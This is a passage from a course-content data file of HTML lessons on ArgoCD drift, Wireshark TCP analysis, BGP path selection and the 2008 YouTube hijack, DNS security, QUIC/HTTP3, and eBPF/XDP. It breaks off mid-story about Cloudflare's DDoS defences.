<p>b) The Git repo has changes that are not yet applied to the cluster</p>
<p>c) The cluster has changes that are not in Git</p>
<p>d) ArgoCD is broken</p>

<p>answer: b</p>
<p>explanation: "OutOfSync" means the desired state (Git) is different from the actual state (cluster). ArgoCD detected the new image tag in Git but has not applied it yet. If auto-sync is on, it will apply shortly. If manual, someone needs to click "Sync."</p>`
      },
      {
        titleEn: "Drift Detection",
        contentEn: `<p>Drift happens when the actual state of your system does not match the desired state in Git.</p>

<p><strong>How drift happens:</strong></p>
<ul>
<li>Someone runs <code>kubectl edit deployment</code> directly on the cluster</li>
<li>A script changes a config outside of the GitOps process</li>
<li>A cloud resource is modified through the web console</li>
<li>An automated process (like HPA) changes replica counts</li>
</ul>

<p><strong>Why drift is dangerous:</strong></p>
<ul>
<li>You think production has version 2.3 (because Git says so)</li>
<li>But someone manually deployed version 2.4 last night</li>
<li>Now your rollback goes to 2.3, skipping unknown changes in 2.4</li>
<li>Debugging becomes impossible: "It works in Git but not in production"</li>
</ul>

<p><strong>How ArgoCD detects drift:</strong></p>
<ol>
<li>ArgoCD reads the desired state from Git</li>
<li>ArgoCD reads the actual state from the K8s API</li>
<li>It compares them field by field</li>
<li>Any difference = drift → status becomes "OutOfSync"</li>
<li>ArgoCD can show you a visual diff (like git diff)</li>
</ol>

<p><strong>Handling drift:</strong></p>
<ul>
<li><strong>Auto-heal (self-heal):</strong> ArgoCD automatically reverts manual changes</li>
<li><strong>Alert:</strong> notify the team that someone made a manual change</li>
<li><strong>Ignore:</strong> some fields (like replica count from HPA) should be excluded from drift detection</li>
</ul>

<p><strong>Best practice: enable self-heal.</strong></p>
<p>If someone makes a manual change, ArgoCD reverts it within seconds. This enforces the rule: all changes must go through Git. No exceptions.</p>

{thinkOutside}
<p>Your team has self-heal enabled. A senior engineer manually scales a deployment from 3 to 10 replicas during a traffic spike. ArgoCD reverts it to 3 within seconds.</p>

<p>Was ArgoCD right to revert it? How should the engineer handle this situation properly?</p>

<p>The correct approach:</p>
<ul>
<li>The engineer should update the Git repo (change replicas to 10, or adjust HPA settings)</li>
<li>Push the commit → ArgoCD syncs → replicas go to 10</li>
<li>This takes 2-3 minutes but maintains the GitOps process</li>
<li>For emergencies: some teams exclude replica count from drift detection and let HPA manage it</li>
<li>Alternative: have an "emergency override" process that commits to Git automatically</li>
</ul>`
      }
    ]
  },

  // ========== RESEARCH TRACK (301-308) ==========
  301: {
    titleEn: "Advanced Wireshark",
    pages: [
      {
        titleEn: "TCP State Machine — Reading the Wire",
        contentEn: `<p>Every TCP connection goes through <strong>states</strong>. Wireshark shows them all.</p>

<p><strong>TCP State Machine (simplified):</strong></p>
<ul>
<li><strong>CLOSED</strong> → SYN sent → <strong>SYN_SENT</strong></li>
<li>SYN+ACK received → <strong>ESTABLISHED</strong></li>
<li>FIN sent → <strong>FIN_WAIT_1</strong> → ACK → <strong>FIN_WAIT_2</strong> → FIN → <strong>TIME_WAIT</strong></li>
<li>Other side: FIN received → <strong>CLOSE_WAIT</strong> → FIN sent → <strong>LAST_ACK</strong> → CLOSED</li>
</ul>

<p><strong>What to look for in Wireshark:</strong></p>
<ul>
<li><strong>[TCP Retransmission]</strong> — a packet was lost, sender tries again</li>
<li><strong>[TCP Dup ACK]</strong> — receiver says "I got packet 5, but I'm still waiting for packet 3"</li>
<li><strong>[TCP Window Full]</strong> — receiver's buffer is full, sender must stop</li>
<li><strong>[TCP Zero Window]</strong> — receiver says "stop sending, I need time"</li>
</ul>

<p><strong>CWND (Congestion Window) analysis:</strong></p>
<ul>
<li>CWND = how many bytes the sender can send before waiting for ACK</li>
<li>Starts small (Slow Start), grows fast (doubles each RTT)</li>
<li>Packet loss → CWND drops to half (Congestion Avoidance)</li>
<li>Wireshark → Statistics → TCP Stream Graphs → Window Scaling</li>
</ul>

<p><strong>Key filters:</strong></p>
<ul>
<li><code>tcp.analysis.retransmission</code> — show only retransmissions</li>
<li><code>tcp.analysis.duplicate_ack</code> — show duplicate ACKs</li>
<li><code>tcp.analysis.zero_window</code> — show zero window events</li>
<li><code>tcp.time_delta > 0.5</code> — show packets with > 500ms delay</li>
</ul>`
      },
      {
        titleEn: "Retransmissions, RTT, and Performance",
        contentEn: `<p><strong>Retransmissions kill performance.</strong> Here's why:</p>

<p><strong>Types of retransmission:</strong></p>
<ul>
<li><strong>Fast Retransmit</strong> — 3 duplicate ACKs trigger immediate resend (good, fast recovery)</li>
<li><strong>RTO Retransmit</strong> — timeout expires, no ACKs at all (bad, slow recovery)</li>
<li><strong>Spurious Retransmit</strong> — packet wasn't really lost, just delayed (wastes bandwidth)</li>
</ul>

<p><strong>Measuring RTT in Wireshark:</strong></p>
<ul>
<li>Filter: <code>tcp.analysis.ack_rtt</code></li>
<li>Statistics → TCP Stream Graphs → Round Trip Time</li>
<li>Normal LAN: 0.1–1ms | Same city: 1–5ms | Cross-continent: 50–150ms</li>
</ul>

<p><strong>The math of latency:</strong></p>
<ul>
<li>1 retransmission at 200ms RTT = 200ms added delay</li>
<li>With RTO backoff: 1st retry 200ms, 2nd retry 400ms, 3rd retry 800ms</li>
<li>1% packet loss on 100ms RTT link → throughput drops by ~30%</li>
</ul>

<p><strong>Practical Wireshark workflow:</strong></p>
<ol>
<li>Capture traffic on the slow connection</li>
<li>Filter to the specific TCP stream: <code>tcp.stream eq 5</code></li>
<li>Check for retransmissions and high RTT</li>
<li>Look at CWND graph — is it sawtoothing (congestion) or flat (application limit)?</li>
<li>Check TIME_WAIT states — too many means connection reuse is broken</li>
</ol>`
      },
      {
        titleEn: "Story: $2 Million in Latency",
        contentEn: `{story}

<p><strong>The $2 Million Latency Bug</strong></p>

<p>A trading company noticed their order execution was 50ms slower than competitors. In high-frequency trading, 50ms is an eternity.</p>

<p><strong>The investigation:</strong></p>
<ul>
<li>Network team said "the network is fine" — ping was 2ms</li>
<li>Application team said "the app is fine" — logs showed fast processing</li>
<li>Everyone blamed everyone else</li>
</ul>

<p><strong>A Wireshark capture revealed the truth:</strong></p>
<ul>
<li>TCP connections were being established fresh for every trade</li>
<li>Each TCP handshake = 3 packets = 1.5 RTT = 3ms</li>
<li>But TLS handshake on top = 2 more RTT = 4ms</li>
<li>Plus TCP Slow Start meant first few packets were throttled</li>
<li>Total overhead per trade: ~15ms</li>
<li>Under load, retransmissions added another 20-35ms</li>
</ul>

<p><strong>The fix:</strong></p>
<ul>
<li>Connection pooling — reuse TCP connections (saved 7ms)</li>
<li>TLS session resumption — skip full handshake (saved 4ms)</li>
<li>TCP tuning — larger initial CWND (saved 4ms)</li>
<li>Total saving: ~15ms per trade</li>
</ul>

<p><strong>The cost before the fix:</strong></p>
<ul>
<li>50ms slower × 40,000 trades/day × average $1 missed profit = ~$2M/year</li>
</ul>

<p><strong>Lesson:</strong> Wireshark doesn't lie. When everyone says "it's not my problem," capture the packets. The truth is always in the wire.</p>

{thinkOutside}
<p>You have a web app that loads slowly. Users complain about 3-second page loads. The server processes requests in 50ms. Where would you capture packets, and what would you look for?</p>`
      }
    ]
  },

  302: {
    titleEn: "BGP — The Internet's Routing Protocol",
    pages: [
      {
        titleEn: "iBGP vs eBGP — How the Internet Routes",
        contentEn: `<p><strong>BGP (Border Gateway Protocol)</strong> is how the internet works. Every ISP, cloud provider, and large company uses it.</p>

<p><strong>Two types:</strong></p>

<table>
<thead><tr><th>Feature</th><th>iBGP</th><th>eBGP</th></tr></thead>
<tbody>
<tr><td>Between</td><td>Routers in SAME AS</td><td>Routers in DIFFERENT AS</td></tr>
<tr><td>AS =</td><td>Autonomous System (one organization)</td><td>—</td></tr>
<tr><td>TTL</td><td>255 (multihop OK)</td><td>1 (direct neighbor only, unless multihop set)</td></tr>
<tr><td>Next-hop</td><td>Does NOT change</td><td>Changes to peer's address</td></tr>
<tr><td>Full mesh?</td><td>Required (or use Route Reflector)</td><td>No, just peer with neighbor</td></tr>
<tr><td>AD value</td><td>200 (less trusted)</td><td>20 (more trusted)</td></tr>
</tbody></table>

<p><strong>AS (Autonomous System):</strong></p>
<ul>
<li>Every ISP/org gets an AS Number (ASN)</li>
<li>Example: Google = AS15169, Cloudflare = AS13335</li>
<li>AS numbers are assigned by IANA → RIRs (ARIN, RIPE, etc.)</li>
</ul>

<p><strong>BGP is a path-vector protocol:</strong></p>
<ul>
<li>Each route carries the full AS path: "to reach 8.8.8.0/24, go through AS3356 → AS15169"</li>
<li>Loop prevention: if a router sees its own ASN in the path, it drops the route</li>
<li>No automatic discovery — you manually configure each neighbor</li>
</ul>

<p><strong>BGP messages:</strong></p>
<ul>
<li><strong>OPEN</strong> — start session, exchange AS numbers and capabilities</li>
<li><strong>UPDATE</strong> — announce new routes or withdraw old ones</li>
<li><strong>KEEPALIVE</strong> — "I'm still here" (every 60 seconds)</li>
<li><strong>NOTIFICATION</strong> — error, session will close</li>
</ul>`
      },
      {
        titleEn: "Path Selection — 13 Criteria",
        contentEn: `<p>When BGP has multiple paths to the same destination, it picks the best one. The selection follows a strict order — first match wins.</p>

<p><strong>BGP Best Path Selection (in order):</strong></p>

<table>
<thead><tr><th>#</th><th>Criteria</th><th>Higher or Lower wins?</th><th>Who controls it?</th></tr></thead>
<tbody>
<tr><td>1</td><td><strong>Weight</strong></td><td>Higher wins</td><td>Local router only (Cisco proprietary)</td></tr>
<tr><td>2</td><td><strong>Local Preference</strong></td><td>Higher wins</td><td>Your AS (iBGP)</td></tr>
<tr><td>3</td><td><strong>Locally originated</strong></td><td>Self-originated wins</td><td>Local router</td></tr>
<tr><td>4</td><td><strong>AS Path length</strong></td><td>Shorter wins</td><td>All ASes in path</td></tr>
<tr><td>5</td><td><strong>Origin type</strong></td><td>IGP < EGP < Incomplete</td><td>Origin AS</td></tr>
<tr><td>6</td><td><strong>MED</strong> (Multi-Exit Discriminator)</td><td>Lower wins</td><td>Neighbor AS (suggestion)</td></tr>
<tr><td>7</td><td><strong>eBGP over iBGP</strong></td><td>eBGP wins</td><td>Topology</td></tr>
<tr><td>8</td><td><strong>Lowest IGP metric</strong></td><td>Lower wins</td><td>Internal routing</td></tr>
<tr><td>9</td><td><strong>Oldest route</strong></td><td>Older wins</td><td>Stability</td></tr>
<tr><td>10</td><td><strong>Lowest Router ID</strong></td><td>Lower wins</td><td>Router config</td></tr>
<tr><td>11</td><td><strong>Shortest cluster list</strong></td><td>Shorter wins</td><td>Route Reflectors</td></tr>
<tr><td>12</td><td><strong>Lowest neighbor address</strong></td><td>Lower wins</td><td>Peer IP</td></tr>
<tr><td>13</td><td><strong>Lowest peer Router ID</strong></td><td>Lower wins</td><td>Peer config</td></tr>
</tbody></table>

<p><strong>The ones that matter most (daily use):</strong></p>
<ul>
<li><strong>Weight</strong> — override everything locally (lab/emergency)</li>
<li><strong>Local Preference</strong> — "our AS prefers this path" (most common tuning)</li>
<li><strong>AS Path</strong> — prepend your ASN multiple times to make a path look longer (traffic engineering)</li>
<li><strong>MED</strong> — "dear neighbor, please enter our network through this link"</li>
</ul>

<p><strong>Example:</strong></p>
<ul>
<li>You have two ISPs: ISP-A (cheap) and ISP-B (fast)</li>
<li>Set Local Preference 200 for ISP-B routes → all outbound traffic uses ISP-B</li>
<li>Prepend your ASN on ISP-A announcements → inbound traffic prefers ISP-B</li>
</ul>`
      },
      {
        titleEn: "Story: Pakistan Took Down YouTube (2008)",
        contentEn: `{story}

<p><strong>February 24, 2008 — Pakistan Telecom hijacks YouTube</strong></p>

<p>The Pakistan government ordered ISPs to block YouTube (over a controversial video).</p>

<p><strong>What Pakistan Telecom did:</strong></p>
<ul>
<li>YouTube's IP range: 208.65.153.0/24</li>
<li>Pakistan Telecom announced a MORE SPECIFIC route: 208.65.153.0/25</li>
<li>BGP rule: more specific prefix always wins (a /25 beats a /24)</li>
</ul>

<p><strong>What happened next:</strong></p>
<ul>
<li>Pakistan Telecom's route leaked to their upstream provider (PCCW, AS3491)</li>
<li>PCCW accepted it and announced it to the entire internet</li>
<li>Within 2 minutes, most of the world's traffic to YouTube went to Pakistan</li>
<li>Pakistan Telecom had no YouTube servers → black hole</li>
<li><strong>YouTube was down worldwide for about 2 hours</strong></li>
</ul>

<p><strong>The fix (manual):</strong></p>
<ul>
<li>YouTube announced even more specific routes: two /25s covering their /24</li>
<li>Engineers contacted PCCW to filter the fake route</li>
<li>Service restored after ~2 hours</li>
</ul>

<p><strong>Why BGP allowed this:</strong></p>
<ul>
<li>BGP is built on <strong>trust</strong> — there was no verification in 2008</li>
<li>Any AS could announce any prefix</li>
<li>No one checked if Pakistan Telecom actually owned 208.65.153.0/24</li>
</ul>

<p><strong>What changed after:</strong></p>
<ul>
<li><strong>RPKI (Resource Public Key Infrastructure)</strong> — cryptographic proof of prefix ownership</li>
<li><strong>IRR (Internet Routing Registry)</strong> — databases of who owns what</li>
<li><strong>BGP communities</strong> — signal intent ("don't export this route")</li>
<li>But adoption is still slow — in 2024, only ~50% of routes are RPKI-signed</li>
</ul>

{questions}
<ol>
<li>Why does a /25 route win over a /24 for the same IP space?</li>
<li>If you run an AS and want to protect against hijacking, what two things should you set up?</li>
<li>Why can't BGP just reject routes from ASes that don't own the prefix?</li>
</ol>`
      }
    ]
  },

  303: {
    titleEn: "DNS Deep Dive",
    pages: [
      {
        titleEn: "Recursive Resolution — Every Step",
        contentEn: `<p>When you type <strong>www.example.com</strong> in your browser, here is exactly what happens.</p>

<p><strong>The 5 actors:</strong></p>
<ol>
<li><strong>Your computer</strong> (stub resolver) — asks, doesn't resolve itself</li>
<li><strong>Recursive resolver</strong> (ISP or 8.8.8.8) — does all the work</li>
<li><strong>Root nameserver</strong> — knows where .com/.org/.net live (13 root server clusters)</li>
<li><strong>TLD nameserver</strong> — knows where example.com's nameserver is</li>
<li><strong>Authoritative nameserver</strong> — has the actual answer</li>
</ol>

<p><strong>Step by step — resolving www.example.com:</strong></p>

<pre><code>1. Browser → OS cache → not found
<ol>
<li>OS → Recursive resolver (e.g., 8.8.8.8): "what is www.example.com?"</li>
<li>Resolver checks its cache → not found</li>
<li>Resolver → Root server (a.root-servers.net): "what is www.example.com?"</li>
</ol>
<p>Root says: "I don't know, but .com is handled by a.gtld-servers.net"</p>
<ol>
<li>Resolver → TLD server (a.gtld-servers.net): "what is www.example.com?"</li>
</ol>
<p>TLD says: "example.com uses ns1.example.com (93.184.216.34)"</p>
<ol>
<li>Resolver → Authoritative (ns1.example.com): "what is www.example.com?"</li>
</ol>
<p>Auth says: "www.example.com = 93.184.216.34, TTL=3600"</p>
<ol>
<li>Resolver caches the answer for 3600 seconds</li>
<li>Resolver → Your computer: "93.184.216.34"</li>
<li>Browser connects to 93.184.216.34</li>
</ol>
</code></pre>

<p><strong>Record types:</strong></p>
<ul>
<li><strong>A</strong> — domain → IPv4 address</li>
<li><strong>AAAA</strong> — domain → IPv6 address</li>
<li><strong>CNAME</strong> — domain → another domain (alias)</li>
<li><strong>MX</strong> — domain → mail server</li>
<li><strong>NS</strong> — domain → nameserver</li>
<li><strong>TXT</strong> — arbitrary text (SPF, DKIM, verification)</li>
<li><strong>SOA</strong> — zone metadata (serial, refresh, retry, expire)</li>
</ul>`
      },
      {
        titleEn: "DNS Security — DNSSEC, DoH, DoT",
        contentEn: `<p><strong>DNS was designed without security.</strong> Everything is plaintext. Anyone can forge responses.</p>

<p><strong>Three security layers:</strong></p>

<p><strong>1. DNSSEC (DNS Security Extensions):</strong></p>
<ul>
<li>Adds <strong>digital signatures</strong> to DNS responses</li>
<li>Chain of trust: Root → .com → example.com (each signs the next)</li>
<li>New record types: RRSIG (signature), DNSKEY (public key), DS (delegation signer)</li>
<li>Protects against: <strong>forged responses</strong> (cache poisoning)</li>
<li>Does NOT encrypt — queries are still visible</li>
<li>Does NOT protect against: snooping on your queries</li>
</ul>

<p><strong>2. DoH (DNS over HTTPS):</strong></p>
<ul>
<li>DNS queries inside normal HTTPS (port 443)</li>
<li>Looks like regular web traffic — hard to block or snoop</li>
<li>Used by: Firefox (Cloudflare), Chrome (Google), browsers</li>
<li>Protects against: <strong>ISP snooping</strong>, network-level blocking</li>
<li>Controversy: bypasses corporate/parental DNS filters</li>
</ul>

<p><strong>3. DoT (DNS over TLS):</strong></p>
<ul>
<li>DNS queries encrypted with TLS (port 853)</li>
<li>Dedicated port — easy to identify and block</li>
<li>Used by: Android (Private DNS), system-level resolvers</li>
<li>Protects against: <strong>snooping</strong> (same as DoH)</li>
<li>Easier for admins to manage than DoH</li>
</ul>

<p><strong>Comparison:</strong></p>

<table>
<thead><tr><th>Feature</th><th>Plain DNS</th><th>DNSSEC</th><th>DoH</th><th>DoT</th></tr></thead>
<tbody>
<tr><td>Encrypted?</td><td>No</td><td>No</td><td>Yes</td><td>Yes</td></tr>
<tr><td>Verified?</td><td>No</td><td>Yes</td><td>No*</td><td>No*</td></tr>
<tr><td>Port</td><td>53</td><td>53</td><td>443</td><td>853</td></tr>
<tr><td>Blockable?</td><td>Yes</td><td>Yes</td><td>Hard</td><td>Easy</td></tr>
</tbody></table>

<p>*DoH/DoT can use DNSSEC too — they're complementary.</p>`
      },
      {
        titleEn: "Story: ISP DNS Hijacking",
        contentEn: `{story}

<p><strong>How ISPs Secretly Redirected Your Web Traffic</strong></p>

<p>In the late 2000s, many ISPs discovered a way to make money from your typos.</p>

<p><strong>Normal behavior:</strong></p>
<ul>
<li>You type "gogle.com" (typo) in browser</li>
<li>DNS resolver returns NXDOMAIN (domain not found)</li>
<li>Browser shows error page</li>
</ul>

<p><strong>What ISPs did:</strong></p>
<ul>
<li>Instead of returning NXDOMAIN, they returned their OWN IP address</li>
<li>Your browser loaded the ISP's search page — full of ads</li>
<li>ISP earned ad revenue from your mistakes</li>
<li>Some ISPs did this for ALL failed DNS queries</li>
</ul>

<p><strong>It got worse:</strong></p>
<ul>
<li>Some ISPs injected ads into ANY HTTP page (not just errors)</li>
<li>They modified DNS responses to redirect through their proxy</li>
<li>The proxy added ad banners to pages you visited</li>
<li>This broke many applications that relied on NXDOMAIN responses</li>
</ul>

<p><strong>Real examples:</strong></p>
<ul>
<li><strong>Comcast (2009)</strong> — redirected NXDOMAIN to search pages</li>
<li><strong>Charter (2008)</strong> — injected JavaScript ads into non-customer pages</li>
<li><strong>Multiple ISPs in Asia</strong> — full DNS hijacking for ad injection</li>
</ul>

<p><strong>Why it worked:</strong></p>
<ul>
<li>DNS is plaintext on port 53</li>
<li>ISP controls the recursive resolver</li>
<li>Most users use their ISP's default DNS</li>
</ul>

<p><strong>How users fought back:</strong></p>
<ul>
<li>Switched to 8.8.8.8 (Google) or 1.1.1.1 (Cloudflare)</li>
<li>Enabled DoH/DoT — ISP can't modify encrypted DNS</li>
<li>DNSSEC adoption increased — forged responses are rejected</li>
</ul>

<p><strong>The bigger lesson:</strong></p>
<ul>
<li>Your ISP can see and modify ALL your plaintext DNS queries</li>
<li>This is why encrypted DNS (DoH/DoT) matters</li>
<li>"If you don't control your DNS, you don't control your internet"</li>
</ul>

{simulation}
<p>You are a network admin. A user reports that typing any non-existent domain shows a strange search page instead of an error. The user is using the company DNS server (192.168.1.1). What steps do you take to diagnose this? What could cause it?</p>`
      }
    ]
  },

  304: {
    titleEn: "QUIC and HTTP/3",
    pages: [
      {
        titleEn: "The Problem HTTP/2 Didn't Solve",
        contentEn: `<p><strong>HTTP/2 fixed many things. But one critical problem remained: Head-of-Line (HOL) blocking at the TCP layer.</strong></p>

<p><strong>What HTTP/2 gave us:</strong></p>
<ul>
<li>Multiplexing — multiple requests on one TCP connection</li>
<li>Header compression (HPACK)</li>
<li>Server push</li>
<li>Stream prioritization</li>
</ul>

<p><strong>The HOL blocking problem:</strong></p>

<pre><code>HTTP/2 multiplexes streams over ONE TCP connection:

<p>Stream 1: [packet A] [packet B] [packet C]</p>
<p>Stream 2: [packet D] [packet E] [packet F]</p>
<p>Stream 3: [packet G] [packet H] [packet I]</p>

<p>All mixed into one TCP byte stream:</p>
<p>TCP: [A][D][G][B][E][H][C][F][I]</p>

<p>If packet D is lost:</p>
<p>TCP: [A][ ? ][G][B][E][H][C][F][I]</p>
<p>↑ TCP stops HERE — waits for D to be retransmitted</p>
<p>Streams 1 and 3 are BLOCKED even though their packets arrived fine</p>
</code></pre>

<p><strong>Why this happens:</strong></p>
<ul>
<li>TCP guarantees <strong>in-order delivery</strong> of bytes</li>
<li>TCP doesn't know about HTTP/2 streams</li>
<li>One lost packet blocks ALL streams on that connection</li>
<li>On lossy networks (mobile, Wi-Fi), this happens often</li>
</ul>

<p><strong>The irony:</strong></p>
<ul>
<li>HTTP/1.1 used 6 parallel TCP connections → loss on one didn't block others</li>
<li>HTTP/2 uses 1 TCP connection → loss blocks everything</li>
<li>On lossy networks, HTTP/2 can be SLOWER than HTTP/1.1</li>
</ul>

<p><strong>This is why QUIC was created:</strong></p>
<ul>
<li>QUIC runs over UDP (not TCP)</li>
<li>Each stream is independent — loss in one stream doesn't block others</li>
<li>QUIC handles reliability per-stream, not per-connection</li>
</ul>`
      },
      {
        titleEn: "QUIC — 0-RTT and Connection Migration",
        contentEn: `<p><strong>QUIC = UDP + reliability + encryption + multiplexing. All built-in.</strong></p>

<p><strong>Key features:</strong></p>

<p><strong>1. 0-RTT Connection Setup:</strong></p>
<pre><code>TCP + TLS 1.3:          QUIC (first time):       QUIC (repeat):
<p>Client → SYN            Client → Initial         Client → 0-RTT data</p>
<p>Server → SYN+ACK        (crypto + data combined)  (send data immediately!)</p>
<p>Client → ACK            Server → Handshake        Server → response</p>
<p>Client → ClientHello    Client → ready</p>
<p>Server → ServerHello    = 1 RTT total             = 0 RTT total</p>
<p>Client → ready</p>
<p>= 3 RTT total</p>
</code></pre>

<ul>
<li>First connection: 1 RTT (TLS handshake + transport setup combined)</li>
<li>Repeat connection: 0 RTT (send data in the first packet!)</li>
<li>TCP+TLS needs 2-3 RTT before sending any data</li>
</ul>

<p><strong>2. No HOL Blocking:</strong></p>
<ul>
<li>Each QUIC stream has its own sequence numbers</li>
<li>Lost packet in Stream 2 → only Stream 2 waits</li>
<li>Streams 1 and 3 continue without delay</li>
</ul>

<p><strong>3. Connection Migration:</strong></p>
<ul>
<li>TCP connection = (source IP, source port, dest IP, dest port)</li>
<li>Change Wi-Fi → 4G? New IP = new TCP connection = start over</li>
<li>QUIC uses a <strong>Connection ID</strong> instead</li>
<li>Switch networks → same Connection ID → connection continues</li>
<li>Your video call doesn't drop when you walk from Wi-Fi to cellular</li>
</ul>

<p><strong>4. Always Encrypted:</strong></p>
<ul>
<li>TLS 1.3 is built into QUIC — not optional</li>
<li>Even packet headers are partially encrypted</li>
<li>Middleboxes (firewalls, NATs) can't inspect or modify QUIC traffic</li>
</ul>

<p><strong>QUIC vs TCP comparison:</strong></p>

<table>
<thead><tr><th>Feature</th><th>TCP + TLS</th><th>QUIC</th></tr></thead>
<tbody>
<tr><td>Transport</td><td>TCP (kernel)</td><td>UDP (userspace)</td></tr>
<tr><td>Encryption</td><td>Optional (TLS on top)</td><td>Built-in (always TLS 1.3)</td></tr>
<tr><td>Handshake</td><td>2-3 RTT</td><td>1 RTT (0 RTT repeat)</td></tr>
<tr><td>HOL blocking</td><td>Yes (connection level)</td><td>No (stream level)</td></tr>
<tr><td>Connection migration</td><td>No</td><td>Yes (Connection ID)</td></tr>
<tr><td>Deployed by</td><td>OS kernel update</td><td>Application update</td></tr>
</tbody></table>`
      },
      {
        titleEn: "Story: Google Built QUIC Quietly",
        contentEn: `{story}

<p><strong>How Google Shipped a New Internet Protocol Without Anyone Noticing</strong></p>

<p>In 2012, Google had a problem. TCP was too slow for their services, especially on mobile networks. But changing TCP meant changing every operating system kernel in the world.</p>

<p><strong>Google's clever solution:</strong></p>
<ul>
<li>Build a new protocol on top of <strong>UDP</strong></li>
<li>UDP is simple — the kernel just passes packets through</li>
<li>All the logic lives in <strong>userspace</strong> (Chrome browser + Google servers)</li>
<li>No kernel changes needed. No OS updates needed.</li>
</ul>

<p><strong>The timeline:</strong></p>
<ul>
<li><strong>2012</strong> — Jim Roskind at Google starts QUIC experiment</li>
<li><strong>2013</strong> — QUIC enabled in Chrome (hidden, experimental)</li>
<li><strong>2014</strong> — Google silently routes Chrome → Google services over QUIC</li>
<li>By 2015, <strong>~50% of Chrome-to-Google traffic</strong> used QUIC</li>
<li>Most users had no idea they were using a new protocol</li>
</ul>

<p><strong>Why no one noticed:</strong></p>
<ul>
<li>QUIC uses UDP port 443 — firewalls already allow it</li>
<li>If QUIC fails, Chrome falls back to TCP automatically</li>
<li>Pages loaded faster — users just thought "Google is fast"</li>
<li>No installation, no configuration, no user action needed</li>
</ul>

<p><strong>The results:</strong></p>
<ul>
<li>Search: 8% faster page loads</li>
<li>YouTube: 15% fewer rebuffers (buffering events)</li>
<li>On lossy mobile networks: 30% faster than TCP</li>
<li>Google proved QUIC worked at scale with billions of users</li>
</ul>

<p><strong>From Google experiment to internet standard:</strong></p>
<ul>
<li><strong>2016</strong> — IETF starts standardizing QUIC (based on Google's design)</li>
<li><strong>2021</strong> — RFC 9000: QUIC is an official internet standard</li>
<li><strong>2022</strong> — RFC 9114: HTTP/3 (HTTP over QUIC) is standardized</li>
<li>Today: ~30% of all web traffic uses QUIC/HTTP3</li>
</ul>

<p><strong>Lesson:</strong> Sometimes the best way to change the internet is to ship it inside a browser update and let users discover the speed improvement on their own.</p>

{thinkOutside}
<p>QUIC runs over UDP. Many corporate firewalls block all UDP except DNS (port 53). How would you handle deploying HTTP/3 in an enterprise environment where UDP 443 might be blocked?</p>`
      }
    ]
  },

  305: {
    titleEn: "eBPF — Programming the Kernel from Outside",
    pages: [
      {
        titleEn: "What is eBPF?",
        contentEn: `<p><strong>eBPF (extended Berkeley Packet Filter)</strong> lets you run custom programs inside the Linux kernel — safely, without modifying kernel code.</p>

<p><strong>The problem eBPF solves:</strong></p>
<ul>
<li>Want to add a firewall rule? Modify kernel module → recompile → reboot</li>
<li>Want to trace a function? Load a kernel module → risk crashing the system</li>
<li>Want custom networking? Write kernel code → wait years for it to ship in a distro</li>
</ul>

<p><strong>eBPF approach:</strong></p>
<ul>
<li>Write a small program in C (or Rust)</li>
<li>Compile it to eBPF bytecode</li>
<li>Load it into the kernel at runtime — no reboot, no kernel rebuild</li>
</ul>

<p><strong>The safety model — Verifier + JIT:</strong></p>

<pre><code>Your eBPF program
<p>↓</p>
<p>[Verifier] — checks BEFORE loading:</p>
<p>✓ No infinite loops (bounded loops only)</p>
<p>✓ No out-of-bounds memory access</p>
<p>✓ No null pointer dereference</p>
<p>✓ Program terminates (max instruction count)</p>
<p>✓ Only allowed kernel functions (helpers)</p>
<p>↓</p>
<p>[JIT Compiler] — converts bytecode to native machine code</p>
<p>↓</p>
<p>Runs at kernel speed (not interpreted)</p>
</code></pre>

<p><strong>Where can eBPF programs attach?</strong></p>
<ul>
<li><strong>Network</strong> — XDP (packet arrives at NIC), TC (traffic control), socket</li>
<li><strong>Tracing</strong> — kprobes (any kernel function), tracepoints, uprobes (userspace)</li>
<li><strong>Security</strong> — LSM hooks (file access, process execution)</li>
<li><strong>Scheduling</strong> — CPU scheduler (Linux 6.6+)</li>
</ul>

<p><strong>eBPF Maps — shared data:</strong></p>
<ul>
<li>Key-value stores shared between eBPF programs and userspace</li>
<li>Types: hash map, array, ring buffer, LRU cache, per-CPU arrays</li>
<li>Example: count packets per IP → eBPF program updates map → userspace reads map</li>
</ul>`
      },
      {
        titleEn: "XDP and Cilium — Real Use Cases",
        contentEn: `<p><strong>XDP (eXpress Data Path)</strong> — process packets at the earliest possible point.</p>

<p><strong>How XDP works:</strong></p>
<pre><code>Packet arrives at NIC
<p>↓</p>
<p>[XDP program runs HERE] ← before kernel networking stack</p>
<p>↓</p>
<p>Decision:</p>
<p>XDP_PASS  → continue to kernel stack (normal processing)</p>
<p>XDP_DROP  → drop packet immediately (never enters kernel)</p>
<p>XDP_TX    → send packet back out same NIC (bounce)</p>
<p>XDP_REDIRECT → send to different NIC or CPU</p>
</code></pre>

<p><strong>Why XDP is so fast:</strong></p>
<ul>
<li>Runs before memory allocation for the packet (no sk_buff)</li>
<li>Runs before any kernel networking code</li>
<li>Can process <strong>millions of packets per second per CPU core</strong></li>
<li>10x faster than iptables for packet filtering</li>
</ul>

<p><strong>Cilium — Kubernetes networking with eBPF:</strong></p>

<p>Traditional K8s networking:</p>
<pre><code>Pod A → veth → bridge → iptables (100s of rules) → bridge → veth → Pod B
</code></pre>

<p>Cilium with eBPF:</p>
<pre><code>Pod A → eBPF program → Pod B  (direct, no iptables)
</code></pre>

<p><strong>What Cilium provides:</strong></p>
<ul>
<li><strong>Networking</strong> — pod-to-pod, service load balancing (replaces kube-proxy)</li>
<li><strong>Security</strong> — L3/L4/L7 network policies (can filter by HTTP path!)</li>
<li><strong>Observability</strong> — Hubble: network flow logs without sidecar proxies</li>
<li><strong>Encryption</strong> — transparent WireGuard encryption between nodes</li>
</ul>

<p><strong>The iptables problem Cilium solves:</strong></p>
<ul>
<li>1000 Kubernetes services = ~20,000 iptables rules</li>
<li>iptables is O(n) — checks rules one by one</li>
<li>eBPF hash maps are O(1) — direct lookup</li>
<li>At scale: 10x–100x faster than iptables</li>
</ul>`
      },
      {
        titleEn: "Story: Cloudflare Stops 800 Gbps DDoS with eBPF",
        contentEn: `{story}

<p><strong>How Cloudflare Uses eBPF to Block Massive DDoS Attacks</strong></p>

<p>Cloudflare handles some of the largest DDoS attacks in history. Their secret weapon? XDP + eBPF.</p>

<p><strong>The challenge:</strong></p>
<ul>
<li>DDoS attacks can be 500 Gbps – 2+ Tbps</li>
<li>Traditional firewalls can't process packets fast enough</li>
<li>iptables at this scale = 100% CPU usage = server dies</li>
<li>You need to drop bad packets BEFORE they consume resources</li>
</ul>

<p><strong>Cloudflare's architecture:</strong></p>
<ol>
